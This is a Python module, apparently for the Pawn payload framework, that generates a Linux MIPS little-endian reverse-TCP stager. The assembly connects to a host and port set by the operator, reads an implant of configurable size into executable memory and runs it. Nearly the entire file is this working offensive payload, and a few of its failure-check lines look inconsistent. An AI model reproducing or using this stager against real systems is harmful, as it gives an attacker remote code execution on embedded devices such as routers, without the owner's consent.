"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from textwrap import dedent

from pex.assembler import Assembler

from pawn.lib.module import *


class PawnModule(Module, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "linux/mipsle/reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Arch': ARCH_MIPSLE,
            'Platform': OS_LINUX,
            'Type': "reverse_tcp",
        })

        self.host = IPv4Option(None, 'Host to connect to.', True)
        self.port = PortOption(None, 'Port to connect to.', True)
        self.length = IntegerOption(4096, 'Length of the implant.', True)
        self.reliable = BooleanOption('yes', 'Make payload reliable.', True)

    def run(self):
        payload = dedent(f"""\
        start:
            li      $t7, -6
            nor     $t7, $t7, $zero
            addi    $a0, $t7, -3
            addi    $a1, $t7, -3
            slti    $a2, $zero, -1
            li      $v0, 4183
            syscall 0x40404
        """)

        if self.reliable.value:
            payload += dedent("""\
                slt $s0, $zero, $a3
                bne $s0, $zero, fail
            """)

        payload += dedent(f"""\
            sw      $v0, -4($sp)

            lw      $a0, -4($sp)
            li      $t7, -3
            nor     $t7, $t7, $zero
            sw      $t7, -30($sp)
            ori     $t6, $zero, 0x{self.port.little.hex()}
            sw      $t6, -28($sp)
            lui     $t6, 0x{self.host.little[:2].hex()}
            ori     $t6, $t6, 0x{self.host.little[2:].hex()}
            sw      $t6, -26($sp)
            addiu   $a1, $sp, -30
            li      $t4, -17
            nor     $a2, $t4, $zero
            li      $v0, 4170
            syscall 0x40404
        """)

        if self.reliable.value:
            payload += dedent("""\
                slt $s0, $zero, $a3
                bne $s0, $zero, fail
            """)

        payload += dedent(f"""\
            li      $a0, -1
            li      $a1, {str(self.length.value+1)}
            addi    $a1, $a1, -1
            li      $t1, -8
            nor     $t1, $t1, $0
            add     $a2, $t1, $0
            li      $a3, 2050
            li      $t3, -22
            nor     $t3, $t3, $zero
            add     $t3, $sp, $t3
            sw      $0, -1($t3)
            sw      $2, -5($t3)
            li      $v0, 4090
            syscall 0x40404
        """)

        if self.reliable.value:
            payload += dedent("""\
                slt $a0, $zero, $a3
                bne $s0, $zero, fail
            """)

        payload += dedent(f"""\
            sw      $v0, -8($sp)

            lw      $a0, -4($sp)
            lw      $a1, -8($sp)
            li      $a2, 4097
            addi    $a2, $a2, -1
            li      $v0, 4003
            syscall 0x40404
        """)

        if self.reliable.value:
            payload += dedent("""\
                slt $a0, $zero, $a3
                bne $s0, $zero, fail
            """)

        payload += dedent("""\
            lw      $a0, -8($sp)
            add     $a1, $v0, $zero
            li      $t1, -3
            nor     $t1, $t1, $0
            add     $a2, $t1, $0
            li      $v0, 4147
            syscall 0x40404
        """)

        if self.reliable.value:
            payload += dedent("""\
                slt $s0, $zero, $a3
                bne $s0, $zero, fail
            """)

        payload += dedent("""\
            lw   $s1, -8($sp)
            lw   $s2, -4($sp)
            jalr $s1
        """)

        if self.reliable.value:
            payload += dedent("""\
            fail:
                li      $a0, $zero
                li      $v0, 4001
                syscall 0x40404
            """)

        return self.assemble(
            self.details['Arch'], payload)
